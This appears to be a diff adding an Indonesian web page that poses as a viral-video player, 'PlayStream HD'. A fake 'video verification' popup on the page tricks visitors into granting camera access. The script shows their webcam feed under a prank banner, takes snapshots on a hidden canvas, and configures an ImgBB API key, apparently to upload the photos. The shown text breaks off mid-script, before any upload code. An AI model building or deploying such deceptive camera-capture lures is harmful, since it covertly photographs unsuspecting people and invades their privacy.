@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Eksklusif: Video Viral Terbaru 2026</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #0f0f0f;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px 10px;
+        }
+
+        /* Container Utama */
+        .main-container {
+            width: 100%;
+            max-width: 850px;
+        }
+
+        /* Navbar Sederhana */
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #272727;
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            font-size: 20px;
+            font-weight: bold;
+            color: #ff0000;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        /* Pemutar Video */
+        .video-wrapper {
+            position: relative;
+            width: 100%;
+            padding-top: 56.25%; /* Ratio 16:9 */
+            background-color: #000000;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
+        }
+
+        .video-content {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Thumbnail Awal */
+        .thumbnail-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(180deg, rgba(0,0,0,0.3) 0%, rgba(0,0,0,0.8) 100%), 
+                        url('https://picsum.photos/1200/675?blur=2') center/cover;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 5;
+            cursor: pointer;
+        }
+
+        .play-btn {
+            width: 80px;
+            height: 80px;
+            background: rgba(255, 0, 0, 0.9);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.6);
+            transition: transform 0.2s, background 0.2s;
+        }
+
+        .play-btn:hover {
+            transform: scale(1.1);
+            background: #ff0000;
+        }
+
+        .play-btn::after {
+            content: '';
+            display: block;
+            width: 0;
+            height: 0;
+            border-style: solid;
+            border-width: 12px 0 12px 22px;
+            border-color: transparent transparent transparent #ffffff;
+            margin-left: 5px;
+        }
+
+        .video-title-overlay {
+            margin-top: 15px;
+            font-size: 18px;
+            font-weight: 600;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.8);
+            text-align: center;
+            padding: 0 20px;
+        }
+
+        /* Video Feed dari Kamera */
+        #webcam {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1); /* Cermin */
+            display: none;
+        }
+
+        /* Overlay Prank Saat Kamera Aktif */
+        .prank-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: none;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            z-index: 10;
+            background: rgba(0,0,0,0.2);
+            pointer-events: none;
+        }
+
+        .prank-banner {
+            background: #ff0000;
+            color: #fff;
+            padding: 10px 20px;
+            font-size: 22px;
+            font-weight: bold;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            animation: pulse 1s infinite alternate;
+        }
+
+        @keyframes pulse {
+            from { transform: scale(1); }
+            to { transform: scale(1.05); }
+        }
+
+        /* Flash Effect */
+        .flash {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #ffffff;
+            opacity: 0;
+            z-index: 20;
+            pointer-events: none;
+        }
+
+        /* Modal / Popup Verifikasi Kamera */
+        .modal-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0, 0, 0, 0.85);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+            backdrop-filter: blur(5px);
+        }
+
+        .modal-card {
+            background: #212121;
+            padding: 25px;
+            border-radius: 12px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            border: 1px solid #333;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
+
+        .modal-icon {
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+
+        .modal-card h3 {
+            margin-bottom: 10px;
+            font-size: 18px;
+        }
+
+        .modal-card p {
+            font-size: 14px;
+            color: #aaa;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+
+        .btn-confirm {
+            background: #ff0000;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 15px;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+        }
+
+        .btn-confirm:hover {
+            background: #cc0000;
+        }
+
+        /* Detail Video Di Bawah Player */
+        .video-info {
+            margin-top: 15px;
+        }
+
+        .video-title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .video-stats {
+            display: flex;
+            justify-content: space-between;
+            color: #aaa;
+            font-size: 14px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #272727;
+        }
+
+        /* Canvas tersembunyi untuk snapshot */
+        canvas {
+            display: none;
+        }
+
+        /* Hasil Foto Snapshot */
+        .result-section {
+            margin-top: 20px;
+            background: #1f1f1f;
+            padding: 15px;
+            border-radius: 8px;
+            display: none;
+            text-align: center;
+        }
+
+        .result-section img {
+            max-width: 100%;
+            border-radius: 8px;
+            margin-top: 10px;
+            border: 2px solid #ff0000;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        <!-- Header -->
+        <div class="navbar">
+            <div class="logo">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="red"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
+                <span>PlayStream HD</span>
+            </div>
+        </div>
+
+        <!-- Video Player -->
+        <div class="video-wrapper">
+            <div class="video-content">
+                <!-- Thumbnail sebelum klik -->
+                <div class="thumbnail-overlay" id="thumbnail" onclick="showPermissionModal()">
+                    <div class="play-btn"></div>
+                    <div class="video-title-overlay">Klik untuk Memutar Video (HD 1080p)</div>
+                </div>
+
+                <!-- Video Stream dari Kamera Wajah Teman -->
+                <video id="webcam" autoplay playsinline muted></video>
+
+                <!-- Overlay Prank -->
+                <div class="prank-overlay" id="prankOverlay">
+                    <div class="prank-banner">🤪 KAMU KENA PRANK! 📸</div>
+                    <div style="background: rgba(0,0,0,0.7); padding: 6px 12px; border-radius: 4px; font-size: 14px;">
+                        Senyum! Wajah kamu sudah tertangkap kamera!
+                    </div>
+                </div>
+
+                <!-- Flash Effect -->
+                <div class="flash" id="flashEffect"></div>
+            </div>
+        </div>
+
+        <!-- Detail Video -->
+        <div class="video-info">
+            <div class="video-title">Video Viral Terpopuler Pekan Ini - Tonton Sampai Selesai!</div>
+            <div class="video-stats">
+                <span>1,245,890x ditonton • 6 Okt 2026</span>
+                <span>👍 45K &nbsp;&nbsp; 👎 Suka &nbsp;&nbsp; ↪ Bagikan</span>
+            </div>
+        </div>
+
+        <!-- Section Hasil Foto Prank (Opsi Tampil Lokal) -->
+        <div class="result-section" id="resultSection">
+            <p style="color: #4CAF50; font-weight: bold;">Foto Prank Berhasil Ditiup!</p>
+            <img id="capturedImage" alt="Hasil Foto">
+            <p id="uploadStatus" style="font-size: 12px; color: #888; margin-top: 8px;"></p>
+        </div>
+    </div>
+
+    <!-- Modal Popup Akses Kamera -->
+    <div class="modal-bg" id="modalBg">
+        <div class="modal-card">
+            <div class="modal-icon">📷</div>
+            <h3>Verifikasi Pemutar Video</h3>
+            <p>Untuk melanjutkan pemutaran video HD, silakan berikan izin akses kamera saat diminta oleh browser.</p>
+            <button class="btn-confirm" onclick="startCamera()">Lihat Video Sekarang</button>
+        </div>
+    </div>
+
+    <!-- Hidden Canvas untuk Snapshot Foto -->
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // CONFIGURASI IMGBB API
+        // Masukkan API Key ImgBB Anda di bawah ini
+        const IMGBB_API_KEY = "MASUKKAN_API_KEY_IMGBB_ANDA_DI_SINI"; 
+
+        const thumbnail = document.getElementById('thumbnail');
+        const modalBg = document.getElementById('modalBg');
+        const webcam = document.getElementById('webcam');
+        const prankOverlay = document.getElementById('prankOverlay');
+        const flashEffect = document.getElementById('flashEffect');
+        const canvas = document.getElementById('canvas');
+        const resultSection = document.getElementById('resultSection');
+        const capturedImage = document.getElementById('capturedImage');
+        const uploadStatus = document.getElementById('uploadStatus');
+
+        function showPermissionModal() {
+            modalBg.style.display = 'flex';
+        }
+
+        // Membunyikan suara jepretan kamera menggunakan Web Audio API (Tanpa file mp3 eksternal)
+        function playShutterSound() {
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.type = 'triangle
